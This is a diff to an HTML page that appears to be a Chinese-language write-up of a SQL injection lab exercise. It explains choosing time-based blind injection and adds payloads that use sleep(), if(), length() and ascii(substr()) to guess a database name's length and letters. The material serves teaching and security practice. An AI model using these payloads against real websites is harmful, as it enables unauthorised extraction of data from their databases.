@@ -151,9 +151,16 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p>输入测试‌：尝试 ?id=1'、?id=1"、?id=1') 等闭合符号，发现无论输入正确或错误，页面均显示相同内容（如“You are in...”），无显性错误回显，说明需使用‌时间盲注。通过 sleep() 函数触发延迟，确认闭合符号为‌单引号‌</p>
 </blockquote>
 <div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> and sleep(5) --+</span>
-<span class="pl-s">#利用sleep()函数触发延时</span>
+<span class="pl-s">#利用sleep()函数触发延时，后续步骤根据是否触发延时来判定正确与否</span>
 <span class="pl-s"></span>
-<span class="pl-s">#后续步骤根据是否触发延时来判定正确与否</span></pre></div></div>
+<span class="pl-s">?id=1<span class="pl-pds">'</span></span> <span class="pl-k">and</span> if(length(database())<span class="pl-k">=</span><span class="pl-c1">8</span>, sleep(<span class="pl-c1">5</span>), <span class="pl-c1">1</span>) <span class="pl-c"><span class="pl-c">--</span>+</span>
+<span class="pl-c"><span class="pl-c">#</span>结合 if() 和 length() 函数，判断数据库名长度是否为8</span>
+
+?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> and if(ascii(substr(database(),1,1))=115, sleep(5), 1) --+</span>
+<span class="pl-s">#逐个猜解数据库名</span>
+<span class="pl-s"></span>
+<span class="pl-s"></span>
+<span class="pl-s"></span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
